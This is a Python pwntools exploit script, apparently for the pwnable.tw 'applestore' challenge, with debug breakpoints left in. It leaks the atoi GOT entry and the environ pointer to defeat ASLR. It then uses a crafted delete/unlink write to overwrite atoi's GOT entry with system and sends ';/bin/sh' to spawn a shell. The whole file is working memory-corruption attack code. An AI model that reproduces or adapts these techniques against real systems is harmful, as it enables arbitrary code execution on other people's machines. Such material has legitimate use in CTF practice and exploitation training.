

from pwn import *
import pdb
import sys


def appstore():
  p.sendlineafter('> ', '1')

def add(idx):
  p.sendlineafter('> ', '2')
  p.sendlineafter('Device Number> ', str(idx))

def delete(idx):
  p.sendlineafter('> ', '3')
  p.sendlineafter('Item Number> ', str(idx))

def cart(msg='y'):
  p.sendlineafter('> ', '4')
  p.sendlineafter('Let me check your cart. ok? (y/n) > ', msg)

def checkout(msg='y'):
  p.sendlineafter('> ', '5')
  p.sendlineafter('Let me check your cart. ok? (y/n) > ', msg)

def exit():
  p.sendlineafter('> ', '6')



def trigger(cont):
  p.sendlineafter('> ', '3')
  p.sendlineafter('Item Number> ', cont)



DEBUG = True

# p = remote('chall.pwnable.tw', 10104)
# elf = ELF('./libc_32.so.6')

if DEBUG:  
  p = process('/home/len/pwnable/applestore')
  elf = ELF('/lib/i386-linux-gnu/libc.so.6')
  

context.log_level = 'debug'

atoi_got = 0x0804B040

system_offset = elf.symbols['system']
bin_offset = list(elf.search('/bin/sh'))[0]
atoi_offet = elf.symbols['atoi']
environ_offset = elf.symbols['environ']

ebp_offset = 260

if __name__ == "__main__":
  for i in range(6):
    add(1)

  for i in range(20):
    add(2)

  # pdb.set_trace()
  checkout()
  # delete(27)
  pdb.set_trace()

  payload = 'y\x0a' + p32(atoi_got) + p32(0) * 3
  p.sendlineafter('> ', payload)
  # exit()

  # checkout(payload)

  # p.recvuntil('\xff' * 2, drop=True)
  
  cart(payload)
  p.recvuntil('27: ', drop=True)
  cont = p.recv(4)

  atoi_addr = u32(cont.ljust(4, '\x00'))
  libc_base = atoi_addr - atoi_offet
  print('atoi_addr: {:#x}'.format(atoi_addr))
  print('libc_base: {:#x}'.format(libc_base))

  system_addr = libc_base + system_offset
  print('system_addr: {:#x}'.format(system_addr))

  environ_addr = libc_base + environ_offset
  print('environ_addr: {:#x}'.format(environ_addr))


  # payload = 'y\x0a'+p32(system_addr)


  payload = 'y\x0a' + p32(environ_addr) + p32(0) * 3
  # trigger(payload)

  cart(payload)
  p.recvuntil('27: ', drop=True)
  cont = p.recv(4)
  print('cont: {:#x}'.format(u32(cont)))
  
  ebp_addr = u32(cont) - ebp_offset
  print('ebp_addr: {:#x}'.format(ebp_addr))

  pdb.set_trace()
  # payload = '7\x0a' + p32(0) + p32(0) + p32(ebp_addr-12) + p32(atoi_got)
  # payload = '7\x0a' + p32(0) * 4
  # p.sendlineafter('> ', payload)

  payload = '27' + p32(0) + p32(0) + p32(atoi_got-0x22) + p32(ebp_addr-8) 
  delete(payload)

  pdb.set_trace()
  
  # p.sendlineafter('> ', p32(system_addr) + ';/bin/sh\x00')
  payload = p32(system_addr) + ';/bin/sh\x00'
  cart(payload)
  p.interactive()


  # 0xffacbefc